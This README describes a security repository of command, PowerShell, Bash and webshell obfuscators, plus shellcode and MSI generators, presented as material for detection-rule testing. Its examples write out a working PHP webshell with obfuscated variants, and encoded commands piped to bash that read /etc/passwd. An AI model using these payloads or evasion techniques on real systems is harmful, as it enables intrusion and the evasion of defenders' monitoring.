# sec-skills

[English](./README.md) | [中文](./README_zh.md)

---

Security research Skills repository for defensive security tooling.

> **Purpose**: Help security researchers generate samples for testing detection capabilities, supporting red/blue team exercises and detection rule development.

## Skills

| Skill | Description |
|-------|-------------|
| [cmd-obfuscate](./docs/cmd-obfuscate.md) | cmd.exe command obfuscation (Invoke-DOSfuscation) |
| [powershell-obfuscate](./docs/powershell-obfuscation.md) | PowerShell command obfuscation (Invoke-Obfuscation) |
| [webshell-obfuscate](./docs/webshell-obfuscation.md) | Webshell obfuscation for PHP/JSP/ASP.NET |
| [bash-obfuscate](./docs/bash-obfuscation.md) | Bash command obfuscation (Bashfuscator) |
| [donut](./docs/donut.md) | .NET assembly to Shellcode (TheWover/donut) |
| [msi-generator](./docs/msi-generator.md) | MSI installer generation (msilib) |

## Quick Examples

### cmd-obfuscate
```bash
$ python3 cmd-obfuscate/cmd_obfuscation.py "netstat -ano" --technique all

[{"technique": "envvar", "command": "cmd /C \"n%PUBLIC:~5,1%%TEMP:~23,1%stat...\""},
 {"technique": "concat", "command": "cmd /V:ON /C \"set X=net&&set Y=stat&&call %X%%Y%\""},
 {"technique": "reverse", "command": "cmd /V:ON /C \"FOR /L %i in (11,-1,0) DO set var=!var!!str:~%i,1!\""}]
```

### powershell-obfuscate
```bash
$ python3 powershell-obfuscate/powershell_obfuscation.py "Write-Host 'Hello'" --encoding all

[{"technique": "base64", "command": "powershell -NoP -NonI -Enc SABoAGUAbABvACAAJwBJAG4AaABlACcA"},
 {"technique": "hex", "command": "powershell -NoP -NonI -Command \"&({0})\" -f [char[]]@(72,101,108,108,111)"},
 {"technique": "bxor", "command": "powershell -NoP -NonI -Command \"IEX $(...)...\""}]
```

### bash-obfuscate
```bash
$ python3 bash-obfuscate/bash_obfuscation.py "cat /etc/passwd" --technique base64

[{"technique": "base64", "command": "echo \"Y2F0IC9ldGMvcGFzc3dk\" | base64 -d | bash"},
 {"technique": "hex", "command": "echo -e \"\\x63\\x61\\x74\" | xxd -r -p | bash"},
 {"technique": "rot13", "command": "echo 'png /etc/cngf' | tr 'a-z' 'n-za-m' | bash"}]
```

### webshell-obfuscate
```bash
$ python3 webshell-obfuscate/webshell_obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

[{"technique": "base64", "output": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"},
 {"technique": "hex", "output": "3c3f7068702073797374656d... (truncated)"},
 {"technique": "concat", "output": "<?php $a='sys'.'tem';$a($_GET['cmd']); ?>"}]
```

## Directory Structure

```
sec-skills/
├── README.md, README_zh.md
├── CLAUDE.md
├── .gitignore
├── cmd-obfuscate/          # cmd.exe obfuscation
├── powershell-obfuscate/   # PowerShell obfuscation
├── webshell-obfuscate/     # Webshell obfuscation
├── bash-obfuscate/         # Bash obfuscation
├── donut/                  # .NET → Shellcode
├── msi-generator/          # MSI installer generation
└── docs/                   # Documentation
```

## Usage

```bash
# Obfuscate commands for testing EDR rules
python3 cmd-obfuscate/cmd_obfuscation.py "netstat -ano" --technique all
python3 powershell-obfuscate/powershell_obfuscation.py "Get-Process" --encoding hex
python3 bash-obfuscate/bash_obfuscation.py "cat /etc/passwd" --technique all

# Generate obfuscated webshells
python3 webshell-obfuscate/webshell_obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

# Generate shellcode from .NET assemblies
python3 donut/donut.py generate malicious.exe -c Namespace.Class -m Main

# Generate MSI installers for testing
python3 msi-generator/msi_generator.py generate output.msi -n MyApp -f myapp.exe
```

## Disclaimer

All tools in this repository are for **authorized defensive security research**, **red/blue team exercises**, and **detection rule development** only.

Do not use any tools in this repository for any unauthorized malicious activities. All users assume their own risk and responsibility for using these tools.
